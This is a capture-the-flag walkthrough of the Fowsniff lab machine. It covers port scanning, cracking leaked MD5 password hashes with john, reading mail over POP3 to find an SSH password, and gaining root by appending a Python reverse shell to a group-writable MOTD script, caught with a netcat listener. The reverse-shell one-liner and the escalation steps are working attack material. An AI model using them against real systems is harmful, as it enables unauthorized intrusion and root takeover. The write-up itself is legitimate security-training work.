@@ -1,0 +1,407 @@
+FOWSNIFF CTF.
+
+
+
+
+[TASK 1: HACK INTO THE FOWSNIFF ORGANISATION]
+[1.1. DEPLOY THE MACHINE. ON THE TOP RIGHT OF THIS YOU WILL SEE A DEPLOY BUTTON. CICK ON THIS TO DEPLOY THE MACHINE INTO THE CLOUD. WAIT A MINUTE FOR IT TO BECOME LIVE]
+Nothing to answer here.
+
+
+
+[1.2. USING NMAP, SCAN THIS MACHINE. WHAT PORTS ARE OPEN?]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.43.53
+[OUTPUT]
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
+110/tcp open  pop3    Dovecot pop3d
+143/tcp open  imap    Dovecot imapd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+[1.3. USING THE INFORMATION FROM THE OPEN PORTS. LOOK AROUND. WHAT CAN YOU FIND?]
+[ACTION: connect to pop3]
+telnet 10.10.43.53 110
+[OUTPUT]
+Connected to 10.10.43.53.
+Escape character is '^]'.
++OK Welcome to the Fowsniff Corporate Mail Server!
+[NOTE]
+We can connect, but its pretty useless since we dont know any password.
+
+
+[ACTION: connect to imap]
+telnet 10.10.43.53 143
+[OUTPUT]
+Trying 10.10.43.53...
+Connected to 10.10.43.53.
+Escape character is '^]'.
+* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Welcome to the Fowsniff Corporate Mail Server!
+
+
+[ACTION: attempt anon login]
+a login "" ""
+[OUTPUT]
+a NO [AUTHENTICATIONFAILED] Authentication failed.
+[NOTE]
+It is disabled.
+
+
+[ACTION: explore http://10.10.43.53/]
+[OUTPUT (snippet)]
+The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.
+
+
+
+[1.4. USING GOOGLE, CAN YOU FIND ANY PUBLIC INFORMATION ABOUT THEM?]
+[ACTION: explore https://x.com/FowsniffCorp]
+We find several interesting tweets.
+[OUTPUT: tweet 1 (https://x.com/FowsniffCorp/status/972208944285388800)]
+Is that your sysadmin? roflcopter
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+
+------------------------------------------------------------------------
+https://pastebin.com/378rLnGi
+[NOTE]
+content of pastebin was taken down.
+
+[OUTPUT: tweet 2 (https://x.com/FowsniffCorp/status/972209781237780480)]
+B1gN1jn4 pwnz all dayyyy lmao
+
+[OUTPUT: tweet 3 (https://x.com/FowsniffCorp/status/972208492227518464)]
+lol gr8 security 
+@FowsniffCorp
+ - too bad I'm dumping all your passwords!
+https://pastebin.com/NrAqVeeX
+[NOTE]
+content of pastebin was taken down.
+
+
+[NOTE]
+Thankfully, another user linked his backup: https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt.
+[ACTION: explore https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt]
+[OUTPUT]
+FOWSNIFF CORP PASSWORD LEAK
+            ''~``
+           ( o o )
++-----.oooO--(_)--Oooo.------+
+|                            |
+|          FOWSNIFF          |
+|            got             |
+|           PWN3D!!!         |
+|                            |         
+|       .oooO                |         
+|        (   )   Oooo.       |         
++---------\ (----(   )-------+
+           \_)    ) /
+                 (_/
+FowSniff Corp got pwn3d by B1gN1nj4!
+No one is safe from my 1337 skillz!
+ 
+ 
+mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel@fowsniff:1dc352435fecca338acfd4be10984009
+baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
+seina@fowsniff:90dc16d47114aa13671c697fd506cf26
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
+sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
+ 
+Fowsniff Corporation Passwords LEAKED!
+FOWSNIFF CORP PASSWORD DUMP!
+ 
+Here are their email passwords dumped from their databases.
+They left their pop3 server WIDE OPEN, too!
+ 
+MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
+ 
+l8r n00bz!
+ 
+B1gN1nj4
+
+-------------------------------------------------------------------------------------------------
+This list is entirely fictional and is part of a Capture the Flag educational challenge.
+
+--- THIS IS NOT A REAL PASSWORD LEAK ---
+ 
+All information contained within is invented solely for this purpose and does not correspond
+to any real persons or organizations.
+ 
+Any similarities to actual people or entities is purely coincidental and occurred accidentally.
+
+-------------------------------------------------------------------------------------------------
+
+
+
+[1.5. CAN YOU DECODE THESE MD5 HASHES? YOU CAN EVEN USE SITES LIKE hashkiller TO DECODE THEM]
+[ACTION: create a hash list (to crack)]
+Content: 
+mauer:8a28a94a588a95b80163709ab4313aa4
+mustikka:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel:1dc352435fecca338acfd4be10984009
+baksteen:19f5af754c31f1e2651edde9250d69bb
+seina:90dc16d47114aa13671c697fd506cf26
+stone:a92b8a29ef1183192e3d35187e0cfabd
+mursten:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede:4d6e42f56e127803285a0a7649b5ab11
+sciana:f7fd98d380735e859f8b2ffbbede5a7e
+[NOTE]
+Saved it as leak_hash.txt
+
+
+[ACTION: crack via john]
+john --format=raw-md5 leak_hash.txt 
+[OUTPUT]
+scoobydoo2       (seina)     
+Proceeding with incremental:ASCII
+apples01         (tegel)     
+bilbo101         (mustikka)     
+skyler22         (baksteen) 
+[NOTE]
+Aborted as it was taking too long.
+It is likely we all ready cracked all the required users.
+
+
+
+[1.6. USING THE USERNAMES AND PASSWORDS YOU CAPTURED, CAN YOU USE METASPLOIT TO BRUTE FORCE THE POP3 LOGIN?]
+Did it with john already.
+
+
+
+[1.7. WHAT WAS SEINA'S PASSWORD TO THE EMAIL SERVICE?]
+[ANSWER (based on last output)]
+scoobydoo2
+
+
+
+[1.8. CAN YOU CONNECT TO THE POP3 SERVICE WITH HER CREDENTIALS? WHAT EMAIL INFORMATION CAN YOU GATHER?]
+[ACTION: connect to pop3 as seina]
+telnet 10.10.43.53 110
+USER seina
+PASS scoobydoo2
+[OUTPUT]
++OK Logged in.
+
+
+[ACTION: list messages]
+LIST
+[OUTPUT]
++OK 2 messages:
+1 1622
+2 1280
+
+
+[ACTION: display message 1]
+RETR 1
+[OUTPUT]
++OK 1622 octets
+Return-Path: <stone@fowsniff>
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1000)
+	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
+    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
+    tegel@fowsniff
+Subject: URGENT! Security EVENT!
+Message-Id: <20180313185107.0FA3916A@fowsniff>
+Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+From: stone@fowsniff (stone)
+
+Dear All,
+
+A few days ago, a malicious actor was able to gain entry to
+our internal email systems. The attacker was able to exploit
+incorrectly filtered escape characters within our SQL database
+to access our login credentials. Both the SQL and authentication
+system used legacy methods that had not been updated in some time.
+
+We have been instructed to perform a complete internal system
+overhaul. While the main systems are "in the shop," we have
+moved to this isolated, temporary server that has minimal
+functionality.
+
+This server is capable of sending and receiving emails, but only
+locally. That means you can only send emails to other users, not
+to the world wide web. You can, however, access this system via 
+the SSH protocol.
+
+The temporary password for SSH is "S1ck3nBluff+secureshell"
+
+You MUST change this password as soon as possible, and you will do so under my
+guidance. I saw the leak the attacker posted online, and I must say that your
+passwords were not very secure.
+
+Come see me in my office at your earliest convenience and we'll set it up.
+
+Thanks,
+A.J Stone
+[NOTE]
+Looks like all seina has her ssh password set as S1ck3nBluff+secureshell
+
+
+[ACTION: display message 2]
+RETR 2
+[OUTPUT]
++OK 1280 octets
+Return-Path: <baksteen@fowsniff>
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1004)
+	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+To: seina@fowsniff
+Subject: You missed out!
+Message-Id: <20180313185405.101CA1AC2@fowsniff>
+Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+From: baksteen@fowsniff
+
+Devin,
+
+You should have seen the brass lay into AJ today!
+We are going to be talking about this one for a looooong time hahaha.
+Who knew the regional manager had been in the navy? She was swearing like a sailor!
+
+I don't know what kind of pneumonia or something you brought back with
+you from your camping trip, but I think I'm coming down with it myself.
+How long have you been gone - a week?
+Next time you're going to get sick and miss the managerial blowout of the century,
+at least keep it to yourself!
+
+I'm going to head home early and eat some chicken soup. 
+I think I just got an email from Stone, too, but it's probably just some
+"Let me explain the tone of my meeting with management" face-saving mail.
+I'll read it when I get back.
+
+Feel better,
+
+Skyler
+
+PS: Make sure you change your email password. 
+AJ had been telling us to do that right before Captain Profanity showed up.
+
+.
+[NOTE]
+No new info.
+
+
+
+[1.9. LOOKING THROUGH HER EMAILS, WHAT WAS A TEMPORARY PASSSWORD SET FOR HER?]
+[ANSWER (from last task output)]
+S1ck3nBluff+secureshell
+
+
+
+[1.10. IN THE EMAIL, WHO SEND IT? USING THE PASSWORD FROM THE PREVIOUS QUESTION AND THE SENDERS USERNAME, CONNECT TO THE MACHINE USING SSH]
+[NOTE]
+Sender is stone.
+Creds: stone|S1ck3nBluff+secureshell
+[ACTION: ssh as stone]
+ssh stone@10.10.43.53
+
+
+[NOTE]
+After some testing, I guess the instructions are talking abut the escond email sender (baksteen), not the first.
+[ACTION: ssh as baksteen]
+ssh baksteen@10.10.43.53
+
+
+
+[1.11. ONCE CONNECTEM, WHAT GROUPS DOES THE USER BELONG TO? ARE THERE ANY INTERESTING FILES THAT CAN BE RUN BY THAT GROUP?]
+[ACTION: check groups of current user]
+id
+[OUTPUT]
+uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
+
+
+[ACTION: find executables for group baksteen]
+find / -group baksteen -perm /g=x -type f 2>/dev/null
+[NOTE]
+No output.
+
+
+[ACTION: find executables for group users]
+find / -group users -perm /g=x -type f 2>/dev/null
+[OUTPUT]
+/opt/cube/cube.sh
+
+
+[ACTION: display script content]
+cat /opt/cube/cube.sh
+[OUTPUT]
+printf "
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions\n\n"
+
+
+[ACTION: check permissions cube]
+ls -l /opt/cube/cube.sh
+[OUTPUT]
+-rw-rwxr-- 1 parede users 851 Mar 11  2018 /opt/cube/cube.sh
+[NOTE]
+We can edit it since we are part of users.
+Line to add: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.23.25.109,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+[1.12. NOW YOU HAVE FOUND A FILE THAT CAN BE EDITED BY THE GROUP, CAN YOU EDIT IT TO INCLUDE A REVERSE SHELL?]
+[ACTION: add rev shell to cube]
+echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.23.25.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /opt/cube/cube.sh
+
+
+
+[1.13. OTHER REVERSE SHELLS: HERE]
+Nothing to answer here.
+
+
+
+[1.14. IF YOU HAVE NOT FOUND OUT ALREADY, TIS FILE IS RUN AS ROOT WHEN A USER CONNECTS TO THE MACHINE USING SSH. WE KNOW THIS AS WHEN WE FIRST CONNECT WE CAN SEE WE GET GIVEN A BANNER (WITH FOWNSNIFF CORP). LOOK IN /etc/update-moto.d/ FILE. IF /AFTER WE HAVE PUT OUR REVERSE SHELL IN THE CUBE FILE) WE THEN INCLUDE THIS FILE IN THE MOTO.D FILE, IT WILL RUN AS ROOT AND WE WILL GET A REVER SHELL AS ROOT!]
+Nothing to do here.
+
+
+
+[1.15. START A NETCAT LISTENER (nc -lnvp 1234) AND THEN RE-LOGIN TO THE SSH SERVICE. YOU WILL THEN RECEIVE A REVERSE SHELL ON YOUR NETCAT SESSION AS ROOT!]
+[ACTION: end ssh session]
+exit
+
+
+[ACTION: start listener]
+nc -lnvp 1234
+
+
+[ACTION: trigger rev shell]
+ssh baskteen@10.10.43.53
+[OUTPUT]
+connect to [10.23.25.109] from (UNKNOWN) [10.10.43.53] 43822
+/bin/sh: 0: can't access tty; job control turned off
+# 
+
+
+[ACTION: stabilize shell]
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl + z
+stty raw -echo; fg
+[NOTE]
+There is no flag to grab. 
+The room is over.
+
+
+
+[1.16. IF YOU ARE REALLY REALLY STUCK, THERE IS A BRILLIANT WALKTHROUGH HERE: https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/. IF ITS EASIER, FOLLOW THIS WALKTHROUGH WITH THE DEPLOYED MACHINE ON THIS SITE]
+Nothing to answer here.
